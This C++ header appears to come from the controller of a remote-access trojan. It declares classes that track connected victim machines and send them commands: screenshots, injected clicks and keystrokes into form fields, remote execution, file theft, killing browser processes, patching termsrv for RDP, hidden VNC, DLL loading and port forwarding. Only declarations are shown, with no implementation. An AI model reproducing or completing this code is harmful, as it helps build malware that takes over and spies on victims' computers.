#pragma once
#include "../common/protocol.h"
#include "../common/lock.h"
// notifications to send to main window

#define PM_CLIENT_ADDED			WM_USER+90
#define PM_CLIENT_REMOVED		WM_USER+91
#define PM_CLIENT_CHANGED		WM_USER+92

// notifications to send to client's window

#define PM_CLIENT_GENERAL				WM_USER+101
#define PM_CLIENT_PROGRESS				WM_USER+102

#define PM_CLIENT_WINDOW_LIST			WM_USER+103
#define PM_CLIENT_WINDOW_SHOT			WM_USER+104
#define PM_CLIENT_LCLICK_CONFIRMED		WM_USER+105
#define PM_CLIENT_KEYS_CONFIRMED		WM_USER+106
#define PM_CLIENT_RUN_CONFIRMED			WM_USER+107
#define PM_CLIENT_PATCH_INFO			WM_USER+108
#define PM_CLIENT_PATCH_START			WM_USER+109
#define PM_CLIENT_CMD_CONFIRMED			WM_USER+110
#define PM_CLIENT_OPTS_CONFIRMED		WM_USER+111
#define PM_CLIENT_FILELIST				WM_USER+112
#define PM_CLIENT_DRIVERLIST			WM_USER+113
#define PM_CLIENT_FILEGET				WM_USER+114
#define PM_CLIENT_PROCESSLIST			WM_USER+123
#define PM_CLIENT_GATEWAY_IPS			WM_USER+124
#define PM_CLIENT_PATCH_TERMSRV			WM_USER+125
#define PM_Client_KILLPROCESSFROMLIST	WM_USER+126

#define PM_Client_PATCHDATA_VNC	WM_USER+127
#define PM_Client_PATCHDATA_RDP	WM_USER+128

// notifications to send to control's window

#define PM_CONTROLS_SEND_COMAND	WM_USER+120

//если WITHOUT_VNC определен, то в релиз не будет включен vnc, а также его не будет в меню
#define WITHOUT_VNC 

class CClient
{
public:

	class CClientList : public list<CClient*>
	{
	};

	class Transaction
	{
	public:
		bool m_bSent;
		PacketBuffer m_Sent;
		bool m_bAnswerReceived;
		PacketBuffer m_Received;
	public:
		Transaction()
			: m_bSent( false )
			, m_bAnswerReceived( false )
		{
		}
		void Reset()
		{
			m_bSent = false;
			m_bAnswerReceived = false;
			m_Sent.Reset();
			m_Received.Reset();
		}
	};

protected:

	SOCKET m_Sock;
	sockaddr_in m_RemoteAddr;
	HANDLE m_hLock;
	PacketBuffer m_Received;

	DWORD m_LastPingTime;
	DWORD m_LastActivity;

	DWORD m_LastInfoRequestTime;
	bool m_InfoReceived;
	RECT m_rcDesktopSize;
	bool m_Is64;
	OSVERSIONINFOEX m_Version;
	WCHAR m_UID[1024];
	
	HWND m_hwClientNotify;


	//HWND m_hwClientNotify;
	CLock m_TransactionLock;
	list<Transaction> m_Transactions;

	

protected:

	bool SendPing( DWORD currentTime );
	bool SendInfoRequest( DWORD currentTime );
	PATCH_DATA_ANSWER *ReadFilePart( PATCH_DATA_REQUEST *request );

	list<Transaction>::iterator FindTransactionToSend( BYTE type ); // does not lock!
	list<Transaction>::iterator FindReceivedTransaction( DWORD type, list<Transaction>::iterator _From ); // does not lock!
	bool UpdateTransaction( PPacket pReply ); // does lock!

	static int NotificationFromType( int type );

public:

	HWND m_ControlWind;
	int AutoUpdate;
	WCHAR m_Coment[256];

	CClient( SOCKET sock, sockaddr_in* addr );
	~CClient( );

	// interface to main window
	void GetListName( LPWSTR buf,LPWSTR Coment );

	// interface to client's window

	void SetClientNotifyWindow( HWND hw );
	
	void KillFromProcessListIE_FF_OP();
	void KillFromProcessList(DWORD pid);
	void RequestProcessList();

	void RequestWindowList();
	void GetWindowList( list<WIN_INFO>& windows );
	void GetFileList( list<WIN32_FIND_DATA>& files );
	void GetCildWindowList( list<WIN_INFO>& windows );

	void RequestWinShot( DWORD_PTR idWindow ,BOOL bIsDelFleg);
	bool GetWinShot( DWORD_PTR idWindow, vector<BYTE>& rawdata );

	void RequestLClick( DWORD_PTR idWindow, int x, int y, bool bDouble );
	//void RequestRClick( DWORD_PTR idWindow, int x, int y, bool bDouble );
	bool GetLClick( DWORD_PTR idWindow );
	void RequestRightMouseDown( DWORD_PTR idWindow,DWORD_PTR idControl, int x, int y );
	void RequestLeftMouseDown( DWORD_PTR idWindow,DWORD_PTR idControl, int x, int y );

	void RequestKeysToForm( DWORD_PTR idWindow,DWORD_PTR idControl, int x, int y, LPCTSTR str, bool bEnter, bool bCtrlA ,bool bIsSendMes);

	void RequestKeys( DWORD_PTR idWindow, int x, int y, LPCTSTR str, bool bEnter, bool bLeft,bool bIsSend  );
	bool GetKeys( DWORD_PTR idWindow );

	//void RequestRun( DWORD idApp,LPCTSTR str );
	void RequestRun( DWORD idApp,LPCTSTR str,LPCTSTR ExeF, DWORD dwHost, BOOL sw_shell, BOOL sw_run_withIE );
	bool GetRunResult( );

	void RequestPatchInfo();
	bool GetPatchInfo( PATCH_INFO* info );

	bool RequestPatchStart();
	bool RequestUploadStart(WCHAR* sourceF, WCHAR* targetF);
	bool GetPatchStartInfo();
	bool RequestUploadStartData();
	bool RequestUploadStartDataVNC();

	void RequestWinCmd( DWORD_PTR idWindow, DWORD cmd );
	void RequestWinCmd( DWORD_PTR idWindow, DWORD cmd, BYTE* data, DWORD dataSize );
	bool GetWinCmdResult( );
	void RunAs(LPCTSTR  cmd,DWORD Style, DWORD RunBy);

	void RequestSetOptions( bool sw_set_get, DWORD sleep1, DWORD sleep2, DWORD sleep3, DWORD prio1,int iAutoUpdate,int iSleep,LPCTSTR Coment,LPCTSTR WinHederName,LPCTSTR ProccessName, LPCTSTR ClassName  );
	bool GetSetOptionsResult( );

	void RequestNamesControl(DWORD_PTR idWindow);
	void CloseWindow(DWORD_PTR idWindow);

	void RequestFileList(DWORD cmd, LPCTSTR FilePath);
	void RequestFileGet( DWORD cmd, DWORD some_data, LPCTSTR FilePath  );
	void RequestDriverList( );
	void RequestGatewayIPs( );
	
	void RequestResumeJava();
	void RequestSuspendJava();
	
	void RequestCLOSE_SB_NOW();
	void RequestLoadDLL();
	void RequestCloseDLL();

	int RequestPortForw(int port );

protected:

	friend class CListener;
	bool Poll( HWND notifyWindow );
	bool IsLocked();
	void Lock();
	void Unlock();
};


class CListener
{
protected:

	int m_Port;

	HANDLE m_hThread;
	DWORD m_dwThreadID;
	HANDLE m_hClThread;
	DWORD m_dwClThreadID;
	HANDLE m_hStopEvent;

	HANDLE m_hChangeEvent;
	CClient::CClientList m_Clients;
	bool m_bEnumStarted;
	CClient::CClientList::iterator m_CurrentClient;
	CLock m_Lock;

	HWND m_hNotify;

	struct CLSocket
	{
		sockaddr_in addr;
		SOCKET sock;
	};

public:

	CListener( int port, HWND notifyWindow );
	~CListener();

	enum Errors
	{
		OK,
		CANT_START_THREAD,
		CANT_CREATE_SOCKET,
		CANT_BIND_SOCKET,
		CANT_LISTEN_SOCKET
	};
		
	Errors GetError();
	bool CheckChanges();
	
	CClient *ClientEnum_First();
	CClient *ClientEnum_Next();
	void ClientEnum_End();

	CClient *VerifyAndLockClient( DWORD_PTR id );
	void UnlockClient( CClient *p );

protected:

	static DWORD WINAPI ListenerThread( LPVOID lpThreadParameter );
	Errors EnumLocalInterfaces( vector<CLSocket>& s );
	Errors CreateListeners( vector<CLSocket>& s );
	void PollListeners( vector<CLSocket>& s );
	void CloseListeners( vector<CLSocket>& s );

	static DWORD WINAPI ClientsThread( LPVOID lpThreadParameter );
	void PollClients( );
};
